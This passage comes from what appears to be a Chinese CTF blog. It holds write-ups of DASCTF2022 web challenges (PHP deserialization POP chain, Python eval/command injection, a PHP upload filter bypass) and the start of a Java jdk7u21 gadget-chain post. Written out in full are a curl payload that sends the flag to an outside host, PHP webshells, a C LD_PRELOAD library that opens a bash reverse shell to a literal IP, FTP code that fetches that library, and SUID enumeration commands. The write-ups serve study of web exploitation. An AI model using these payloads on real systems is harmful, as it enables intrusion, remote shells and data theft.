class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pop链：</p>
<blockquote>
<p>1.首先找到<code>destruct</code>方法作为入口，触发toString</p>
<p>2.what类里面转到mix类的run方法</p>
<p>3.mix的run触发crow的invoke方法</p>
<p>4.然后触发call方法调用get_flag</p>
<p>5.最后换行绕过注释</p>
</blockquote>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v1</span>,<span class="variable">$v2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1 = <span class="variable">$v1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v2 = <span class="variable">$v2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;f1 = <span class="variable">$f1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$m1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;m1 = <span class="variable">$m1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fin(<span class="keyword">new</span> what(<span class="keyword">new</span> mix(<span class="keyword">new</span> crow(<span class="keyword">new</span> fin(<span class="keyword">new</span> mix(<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">system(\&#x27;grep -r &quot;&#123;&quot;\&#x27;);&#x27;</span>)),<span class="string">&#x27;&#x27;</span>))));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dd21e53e9fd84bd6a15edb95d6ea3c40.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<blockquote>
<p>复现来啦 ~</p>
</blockquote>
<h4 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, render_template_string, redirect, request, current_app, session, \</span><br><span class="line">    abort, send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">s</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;class&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;getattribute&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip, num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p><strong>1.赛时</strong></p>
<p>waf过滤了很多关键词和符号，所以几乎不能用SSTI注入，<del>但是当时就想着肯定能用SSTI</del>，所以就一直卡住了（</p>
<p>然后因为之前做过类似的，利用报错进行模板注入，但是这道题利用<code>1/0#</code>这种形式也是完全过不了的，因为有js进行检测</p>
<p>然后就把目光放到了eval中，在想着该怎么传入num才使得eval或者system执行我们想要的代码，但是一直没有想到该怎么办</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime()), ip, num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br></pre></td></tr></table></figure>

<p><strong>2.赛后</strong></p>
<p>赛后看了<a href="https://blog.csdn.net/weixin_51458899/article/details/123782291?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_paycolumn_v3&spm=1001.2101.3001.4242.2&utm_relevant_index=4">别的师傅</a>的wp</p>
<p>确实是从<code>os.system(log)</code>入手的，但是这里用到<code>#</code>是为了注释掉后面的内容，因为如果<code>eval(num)</code>出错的话，是不会进行下去的，导致实现不了rce</p>
<p><img src="https://img-blog.csdnimg.cn/a225b8cc4c674fe0809fe6974957923f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>而python又支持<code>#</code>与字符连接还是能当作注释符，而在unix中如果<code>#</code>与字符相邻则也会被当作字符，就可以利用这个区别直接构造payload</p>
<p>再利用反引号进行命令执行</p>
<p><img src="https://img-blog.csdnimg.cn/eeab61a3bc544fbe875c608f7ea37202.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>不过感觉可能是环境原因，直接用反引号没有返回值，直接用curl外带，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc?num=1%23`curl%09http://vps:5656/?flag=\`cat%09Th1s*\``</span><br></pre></td></tr></table></figure>

<h4 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h4><ul>
<li>SplFileObject</li>
<li>利用环境变量getshell putenv</li>
<li>python搭建ftp服务</li>
<li>suid提权</li>
</ul>
<p><strong>1.赛时</strong></p>
<p>一看是文件上传，还只能上传php文件，那就直接看<code>phpinfo()</code>，然后就可以发现很多常用的函数被禁掉了，然后后来突然想到用FFI，但是一看，也被禁掉了</p>
<p><img src="https://img-blog.csdnimg.cn/096fe2b528874e2db312bd5aed3e89b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>再后来尝试用原生类，我们在测试中可以发现<code>=|$|-|^</code>等字符也不可用， 那也几乎不可以用原生类，因为既然不能用<code>$</code>来赋值，那么只能直接new一个类来用<code>-&gt;</code>来调用方法，但是显而易见不可以，之后就直接摆了（🥺</p>
<p><strong>2.赛后</strong></p>
<p>① show_source没有被ban，但是会被过滤，可以利用php大小写不敏感绕过，获取<code>index.php</code>的源码，不仅过滤了函数还过滤了特殊字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(fun(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = md5(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>② 上传文件</p>
<h6 id="一些有用的知识"><a href="#一些有用的知识" class="headerlink" title="一些有用的知识"></a>一些有用的知识</h6><p>​    Ⅰ.可以利用base64+php伪协议包含文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//yuer.php</span></span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ <span class="comment">// <span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// yuer1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(base64_decode(<span class="string">&quot;cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPTJjYzAxMzkzMmVhZjJmY2IzODNmZGE3MzVmZWYwYTM2LnBocA==&quot;</span>)); <span class="comment">// php://filter/read=convert.base64-decode=xxx.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dc1f4ea68a4141578c4dca57a89f3512.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>​        Ⅱ. 字符串拼接动态函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>)(<span class="string">&quot;/var/www/html/index.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​        Ⅲ. 原生类<strong>SplFileObject::fwrite</strong>写入文件</p>
<p>学到了新语法！！好耶！</p>
<p>重写一个类是为了实现把动态方法实现静态调用，因为动态调用的<code>-</code>被ban了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define(<span class="string">&quot;F&quot;</span>, <span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>); </span><br><span class="line">define(<span class="string">&quot;VALUE&quot;</span>,(F)(<span class="string">&quot;/var/www/html/index.php&quot;</span>)[<span class="number">353</span>]);</span><br><span class="line">define(<span class="string">&quot;E&quot;</span>, <span class="string">&quot;e&quot;</span>.<span class="string">&quot;val&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;SHELL&quot;</span>,<span class="string">&quot;&lt;?php &quot;</span>.E.<span class="string">&quot;(&quot;</span>.VALUE.<span class="string">&quot;_POST[&#x27;a&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (F)(<span class="string">&quot;./shell.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Splf</span> <span class="keyword">extends</span> <span class="title">SplFileObject</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::fwrite(SHELL);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;AMEUU&quot;</span>,<span class="keyword">new</span> Splf(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>③ bypass disable_functions</p>
<p>由于<code>putenv</code>没有被ban，可以通过修改<code>LD_PRELOAD</code>环境变量的值，可以执行我们上传的恶意os文件</p>
<p>exp：</p>
<p>因为putenv和mail都没有被ban，所以可以利用mail触发getuid反弹shell</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/82.156.2.166/3434 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>

<h6 id="另一些有用知识"><a href="#另一些有用知识" class="headerlink" title="另一些有用知识"></a>另一些有用知识</h6><p>​    Ⅰ. 用python搭建ftp服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pyftpdlib -p 21</span><br></pre></td></tr></table></figure>

<p>​    Ⅱ. 将vps中的exp.so写进靶场中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$local_file</span> = <span class="string">&quot;/tmp/exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$server_file</span> = <span class="string">&quot;exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$vps</span> = <span class="string">&quot;82.156.2.166&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ftp</span> = ftp_connect(<span class="variable">$vps</span>,<span class="variable">$port</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = ftp_login(<span class="variable">$ftp</span>, <span class="string">&#x27;anonymous&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ftp_pasv(<span class="variable">$ftp</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ftp_get(<span class="variable">$ftp</span>, <span class="variable">$local_file</span>,<span class="variable">$server_file</span>,FTP_BINARY))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;wrong&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_close(<span class="variable">$ftp</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/177fbab174d5473397c10b2f4b6e9351.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>然后只要将<code>LD_PRELOAD</code>设置为exp.so所在的目录，然后执行mail函数触发getuid就好了，别忘了vps要监听</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">putenv(&quot;LD_PRELOAD=/tmp/exp.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/59577ef792854b90bb33e5b1697243fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h6 id="suid-提权"><a href="#suid-提权" class="headerlink" title="suid 提权"></a>suid 提权</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /bin -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find /usr -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>发现有权限使用nl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nl /flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://erroratao.github.io/writeup/DASCTF2022xSU/">https://erroratao.github.io/writeup/DASCTF2022xSU/</a></p>
<p><a href="https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/#bypass-disable_functions">https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/#bypass-disable_functions</a></p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>das</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步学习Ⅵ</title>
    <url>/2022/07/27/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A5/</url>
    <content><![CDATA[<blockquote>
<p>持续更新中……</p>
</blockquote>
<h2 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h2><p>环境：<code>jdk7u21</code></p>
<p>从yso给的链分析，关键代码：</p>
<p>其中涉及的<code>Gadgets</code> 和<code>Reflections</code> 两个类都是yso里面给的，到时候再分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Yso</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String command = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">        Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>); <span class="comment">// 为了实现调用链</span></span><br><span class="line"></span><br><span class="line">        map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(set);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bis = <span class="keyword">new</span> ByteArrayInputStream(bos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span 